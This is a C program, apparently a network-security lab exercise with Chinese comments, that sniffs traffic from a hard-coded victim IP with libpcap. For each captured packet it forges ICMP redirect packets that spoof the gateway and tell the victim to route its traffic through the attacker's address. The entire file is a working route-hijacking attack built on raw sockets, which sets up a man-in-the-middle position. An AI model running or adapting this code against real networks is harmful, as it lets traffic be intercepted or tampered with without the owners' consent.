#include <pcap.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include<sys/socket.h>
#include<unistd.h>
#include <string.h>
#include <arpa/inet.h>

#define MAX 1024
#define SIZE_ETHERNET 14

const unsigned char *Target_IP = "192.168.32.132"; //靶机IP
const unsigned char *Ori_Gw = "192.168.32.2";      //网关
const unsigned char *Redic_IP = "192.168.32.131";  //修改之后的网关，这里我们设置为攻击者ip
int flag = 0;

//IP header
/* IP header */
struct ip_header {
#ifdef WORDS_BIGENDIAN
    u_int8_t ip_version:4;
  u_int8_t ip_header_length:4;
#else
    u_int8_t ip_header_length:4;
    u_int8_t ip_version:4;
#endif
    u_char  ip_tos;                 /* type of service */
    u_short ip_len;                 /* total length */
    u_short ip_id;                  /* identification */
    u_short ip_off;                 /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
    u_char  ip_ttl;                 /* time to live */
    u_char  ip_protocol;                   /* protocol */
    u_short ip_checksum;                  /* checksum */
    struct  in_addr ip_source_address,ip_destination_address;  /* ip_destination_address */
};


// icmp 重定向报文头
struct icmp_header
{
    u_int8_t icmp_type;
    u_int8_t icmp_code;
    u_int16_t icmp_checksum;
    struct in_addr icmp_gateway_addr;

    //u_int16_t icmp_identifier;
    //u_int16_t icmp_sequence;
};

/*
 * 计算校验和
 * @param buf //需要校验的数据
 * @param len //长度
 */
u_int16_t checksum(u_int8_t *buf,int len);

/*
 * 重定向包
 * @param sockfd  套接字描述副
 * @param data    抓到的数据包IP头+IP 数据前8个
 * @param datalen 包大小
 */
void ping_redirect(int sockfd,const unsigned char *data,int datalen);

//  处理包
void parseIPHeader(const u_char *ip_packet);

// 回调函数原型
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

u_int16_t checksum(u_int8_t *buf,int len){
    u_int32_t sum=0; // step1: 将校验和字段设置为0
    u_int16_t *cbuf;

    cbuf=(u_int16_t *)buf; //step2: 将需要校验的数据看作以16位为单位的数字组成。

    while(len>1) // step3: 依次进行二进制反码求和
    {
        sum+=*cbuf++;
        len-=2;
    }

    if(len)    // step4: 得到的结果存入检验和字段
        sum+=*(u_int8_t *)cbuf;

    sum=(sum>>16)+(sum & 0xffff);
    sum+=(sum>>16);

    return ~sum;
}

void ping_redirect(int sockfd,const unsigned char *data,int datalen){
    char buf[MAX],*p;
    struct ip_header *ip;
    struct icmp_header *icmp;
    int i;
    struct sockaddr_in dest;

    //buf : packetz
    memset(buf,0,MAX);

    /*目标IP  这里为靶机ip*/
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(Target_IP);

    //手动填充 ip头
    ip = (struct ip_header*)buf;
    ip->ip_version = 4;
    ip->ip_header_length = sizeof(struct ip_header)>>2;
    ip->ip_tos = 0;
    ip->ip_len = sizeof(struct ip_header) + sizeof(struct icmp_header) + datalen;
    ip->ip_id = 0;
    ip->ip_ttl = 255;
    ip->ip_protocol = IPPROTO_ICMP;
    ip->ip_source_address.s_addr = inet_addr(Ori_Gw);           //要伪造网关发送ip报文
    ip->ip_destination_address.s_addr = inet_addr(Target_IP);   //将伪造重定向包发给受害者

    //手动填充ICMP头部
    icmp = (struct icmp_header*)(buf+20);
    icmp->icmp_type = 5;//ICMP_REDIRECT
    icmp->icmp_code = 1;//重定向主机的数据报
    icmp->icmp_checksum = 0;
    icmp->icmp_gateway_addr.s_addr = inet_addr(Redic_IP);//告诉受害者 将网关ip改成redic_ip

    //存放之后填充的拷贝
    p = buf+28;
    for(i=0;i<datalen;++i)
    {
        p[i] = data[i];//拷贝抓来的ip头和数据部分前8字节
    }


    icmp->icmp_checksum = checksum((unsigned short *)icmp, 36);//8 + 20 + 8

    /*
     * 发送套接字
     * @param sockfd 发送端套接字描述符
     * @param buf    待发送数据缓冲区
     * @param 56     待发送数据IP头长度(20) + ICMP头部长度(8) + IP首部(20) + IP前8个字节
     * @param 0      flag标志位
     * @param dest   数据发送的目的地址，当然就是靶机
     * @param sizeof(dest) 地址长度
     */
    sendto(sockfd,buf,56,0,(struct sockaddr *)&dest,sizeof(dest));
    //printf("send\n");
}

//处理包
void parseIPHeader(const u_char *ip_packet)
{
    const struct ip_header *ip;
    ip = (struct ip_header*)ip_packet;
    int ip_header_len = ip->ip_header_length*4;

    if(ip_header_len<20)
    {
        //printf("Invalid IP header len!\n");
        return;
    }

    printf("Src :%s\n",inet_ntoa(ip->ip_source_address));

    if(!strcmp(Target_IP,inet_ntoa(ip->ip_source_address)))
    {
        //抓到被攻击者的数据包！
        //printf("find!\n");
        flag = 1;
        int count=0;
        while(1)
        {
            int sockfd,res;
            int one = 1;
            int *ptr_one = &one;
            //printf("here!\n");
            //构造的是ICMP报文
            if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
            {
                printf("create sockfd error\n");
                exit(-1);
            }
            //IP层的协议，代表我们要自己设置socket选项
            res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));
            if(res < 0)
            {
                printf("error--\n");
                exit(-3);
            }

            ping_redirect(sockfd,ip_packet,28);//20字节ip头加上8字节上层协议,作为新发送icmp的数据部分
            if(count++<5)
                continue;
            break;
        }

    }

}

void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
    static int id = 0; //packet counter
    const struct sniff_ethernet *ethernet; //设备
    const struct ip_header *ip; //ip头部


    printf("=============================\n");
    printf("Packet number: %d\n", ++id);
    printf("Packet length: %d\n", pkthdr->len);

    //printf("Number of bytes: %d\n", pkthdr->caplen);
    //printf("Recieved time: %s", ctime((const time_t *)&pkthdr->ts.tv_sec));

    //接受到的是以太网帧
    // ethernet = (struct sniff_ethernet*)packet;
   // ip = (struct ip_header*)(packet + SIZE_ETHERNET);

    parseIPHeader(packet + SIZE_ETHERNET);
}

int main(){
    char *dev = NULL;			/* capture device name */
    char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
    pcap_t *handle;				/* packet capture handle */
    struct bpf_program fp;		/* The compiled filte */
    char filterstr[50]={0};
    sprintf(filterstr,"src host %s",Target_IP);
    /* Define the device */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    } else{
        printf("success: device: %s\n", dev);
    }
    handle = pcap_open_live(dev, 65535, 1, 1000, errbuf);
    pcap_compile(handle, &fp, filterstr, 1, 0);
    pcap_setfilter(handle, &fp);

    /* wait loop forever */
    int id = 0;
    pcap_loop(handle, -1, getPacket, NULL);
    return 0;
}